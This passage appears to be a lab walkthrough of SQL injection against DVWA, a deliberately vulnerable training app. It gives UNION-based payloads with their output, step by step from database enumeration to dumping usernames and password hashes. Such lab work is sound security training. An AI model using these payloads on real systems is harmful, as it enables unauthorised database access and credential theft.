3. Enter 1 in input box of User ID and click on submit.

ID: 1
First name: admin
Surname: admin


ID: 2
First name: Gordon
Surname: Brown


ID: 3
First name: Hack
Surname: Me

ID: 4
First name: Pablo
Surname: Picasso


4. An advanced method to extract all the First names and Surnames

ID: %' or '1'='1'#   
First name: admin
Surname: admin
ID: %' or '1'='1'#   
First name: Gordon
Surname: Brown
ID: %' or '1'='1'#   
First name: Hack
Surname: Me
ID: %' or '1'='1'#   
First name: Pablo
Surname: Picasso
ID: %' or '1'='1'#   
First name: Bob
Surname: Smith


ID: %' or '1' ='1' --' 
First name: admin
Surname: admin
ID: %' or '1' ='1' --' 
First name: Gordon
Surname: Brown
ID: %' or '1' ='1' --' 
First name: Hack
Surname: Me
ID: %' or '1' ='1' --' 
First name: Pablo
Surname: Picasso
ID: %' or '1' ='1' --' 
First name: Bob
Surname: Smith


5. To extract database version:

ID:   %' or 0=0 union select null,version()# 
First name: admin
Surname: admin
ID:   %' or 0=0 union select null,version()# 
First name: Gordon
Surname: Brown
ID:   %' or 0=0 union select null,version()# 
First name: Hack
Surname: Me
ID:   %' or 0=0 union select null,version()# 
First name: Pablo
Surname: Picasso
ID:   %' or 0=0 union select null,version()# 
First name: Bob
Surname: Smith
ID:   %' or 0=0 union select null,version()# 
First name: 
Surname: 10.4.32-MariaDB


6. To get all database user:

ID:  %' or 0=0 union select null,user()#
First name: admin
Surname: admin
ID:  %' or 0=0 union select null,user()#
First name: Gordon
Surname: Brown
ID:  %' or 0=0 union select null,user()#
First name: Hack
Surname: Me
ID:  %' or 0=0 union select null,user()#
First name: Pablo
Surname: Picasso
ID:  %' or 0=0 union select null,user()#
First name: Bob
Surname: Smith
ID:  %' or 0=0 union select null,user()#
First name: 
Surname: root@localhost


7. Display database name:

ID: %' or 0=0 union select null,database()# 
First name: admin
Surname: admin
ID: %' or 0=0 union select null,database()# 
First name: Gordon
Surname: Brown
ID: %' or 0=0 union select null,database()# 
First name: Hack
Surname: Me
ID: %' or 0=0 union select null,database()# 
First name: Pablo
Surname: Picasso
ID: %' or 0=0 union select null,database()# 
First name: Bob
Surname: Smith
ID: %' or 0=0 union select null,database()# 
First name: 
Surname: dvwa


8. Display all tables in information_schema:

ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: ALL_PLUGINS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: APPLICABLE_ROLES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: CHARACTER_SETS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: CHECK_CONSTRAINTS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: COLLATIONS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: COLLATION_CHARACTER_SET_APPLICABILITY
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: COLUMNS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: COLUMN_PRIVILEGES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: ENABLED_ROLES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: ENGINES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: EVENTS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: FILES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: GLOBAL_STATUS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: GLOBAL_VARIABLES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: KEYWORDS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: KEY_CACHES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: KEY_COLUMN_USAGE
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: OPTIMIZER_TRACE
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: PARAMETERS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: PARTITIONS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: PLUGINS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: PROCESSLIST
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: PROFILING
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: REFERENTIAL_CONSTRAINTS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: ROUTINES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: SCHEMATA
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: SCHEMA_PRIVILEGES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: SESSION_STATUS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: SESSION_VARIABLES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: STATISTICS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: SQL_FUNCTIONS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: SYSTEM_VARIABLES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: TABLES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: TABLESPACES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: TABLE_CONSTRAINTS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: TABLE_PRIVILEGES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: TRIGGERS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: USER_PRIVILEGES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: VIEWS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: GEOMETRY_COLUMNS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: SPATIAL_REF_SYS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: CLIENT_STATISTICS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INDEX_STATISTICS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_SYS_DATAFILES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: USER_STATISTICS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_SYS_TABLESTATS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_LOCKS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_MUTEXES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_CMPMEM
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_CMP_PER_INDEX
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_CMP
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_FT_DELETED
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_CMP_RESET
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_LOCK_WAITS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: TABLE_STATISTICS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_TABLESPACES_ENCRYPTION
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_BUFFER_PAGE_LRU
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_SYS_FIELDS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_CMPMEM_RESET
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_SYS_COLUMNS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_FT_INDEX_TABLE
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_CMP_PER_INDEX_RESET
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: user_variables
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_FT_INDEX_CACHE
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_SYS_FOREIGN_COLS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_FT_BEING_DELETED
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_BUFFER_POOL_STATS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_TRX
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_SYS_FOREIGN
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_SYS_TABLES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_FT_DEFAULT_STOPWORD
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_FT_CONFIG
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_BUFFER_PAGE
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_SYS_TABLESPACES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_METRICS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_SYS_INDEXES
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_SYS_VIRTUAL
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_TABLESPACES_SCRUBBING
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: INNODB_SYS_SEMAPHORE_WAITS
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: guestbook
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: users
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: columns_priv
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: column_stats
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: db
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: event
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: func
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: general_log
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: global_priv
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: gtid_slave_pos
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: help_category
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: help_keyword
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: help_relation
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: help_topic
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: index_stats
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: innodb_index_stats
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: innodb_table_stats
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: plugin
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: proc
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: procs_priv
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: proxies_priv
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: roles_mapping
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: servers
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: slow_log
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: tables_priv
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: table_stats
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: time_zone
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: time_zone_leap_second
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: time_zone_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: time_zone_transition
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: time_zone_transition_type
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: transaction_registry
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: user
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: cond_instances
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_waits_current
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_waits_history
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_waits_history_long
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_waits_summary_by_host_by_event_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_waits_summary_by_instance
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_waits_summary_by_thread_by_event_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_waits_summary_by_user_by_event_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_waits_summary_by_account_by_event_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_waits_summary_global_by_event_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: file_instances
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: file_summary_by_event_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: file_summary_by_instance
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: host_cache
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: mutex_instances
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: objects_summary_global_by_type
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: performance_timers
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: rwlock_instances
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: setup_actors
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: setup_consumers
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: setup_instruments
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: setup_objects
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: setup_timers
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: table_io_waits_summary_by_index_usage
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: table_io_waits_summary_by_table
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: table_lock_waits_summary_by_table
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: threads
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_stages_current
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_stages_history
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_stages_history_long
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_stages_summary_by_thread_by_event_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_stages_summary_by_account_by_event_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_stages_summary_by_user_by_event_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_stages_summary_by_host_by_event_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_stages_summary_global_by_event_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_statements_current
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_statements_history
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_statements_history_long
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_statements_summary_by_thread_by_event_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_statements_summary_by_account_by_event_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_statements_summary_by_user_by_event_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_statements_summary_by_host_by_event_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_statements_summary_global_by_event_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: events_statements_summary_by_digest
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: accounts
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: hosts
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: socket_instances
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: socket_summary_by_instance
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: socket_summary_by_event_name
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: session_connect_attrs
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: session_account_connect_attrs
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__bookmark
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__central_columns
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__column_info
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__designer_settings
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__export_templates
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__favorite
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__history
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__navigationhiding
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__pdf_pages
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__recent
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__relation
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__savedsearches
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__table_coords
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__table_info
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__table_uiprefs
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__tracking
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__userconfig
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__usergroups
ID:  %' and 1=0 union select null,  table_name from information_schema.tables # 
First name: 
Surname: pma__users

9. Display all the users tables in information_schema:  

ID: %' OR 1=0 union select null,table_name from information_schema.tables where  table_name like 'users%'# 
First name: 
Surname: users

or Display all tables of database

ID: ' union select table_name,table_name from  information_schema.tables where table_schema='dvwa'#
First name: guestbook
Surname: guestbook
ID: ' union select table_name,table_name from  information_schema.tables where table_schema='dvwa'#
First name: users
Surname: users

10. Display all the columns fields

ID: ' union select column_name,column_name from information_schema.columns where  table_schema='dvwa'#
First name: comment_id
Surname: comment_id
ID: ' union select column_name,column_name from information_schema.columns where  table_schema='dvwa'#
First name: comment
Surname: comment
ID: ' union select column_name,column_name from information_schema.columns where  table_schema='dvwa'#
First name: name
Surname: name
ID: ' union select column_name,column_name from information_schema.columns where  table_schema='dvwa'#
First name: user_id
Surname: user_id
ID: ' union select column_name,column_name from information_schema.columns where  table_schema='dvwa'#
First name: first_name
Surname: first_name
ID: ' union select column_name,column_name from information_schema.columns where  table_schema='dvwa'#
First name: last_name
Surname: last_name
ID: ' union select column_name,column_name from information_schema.columns where  table_schema='dvwa'#
First name: user
Surname: user
ID: ' union select column_name,column_name from information_schema.columns where  table_schema='dvwa'#
First name: password
Surname: password
ID: ' union select column_name,column_name from information_schema.columns where  table_schema='dvwa'#
First name: avatar
Surname: avatar
ID: ' union select column_name,column_name from information_schema.columns where  table_schema='dvwa'#
First name: last_login
Surname: last_login
ID: ' union select column_name,column_name from information_schema.columns where  table_schema='dvwa'#
First name: failed_login
Surname: failed_login


11. Extract Credentials

ID:  ' UNION SELECT user, password FROM  users#
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
ID:  ' UNION SELECT user, password FROM  users#
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03
ID:  ' UNION SELECT user, password FROM  users#
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
ID:  ' UNION SELECT user, password FROM  users#
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
ID:  ' UNION SELECT user, password FROM  users#
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99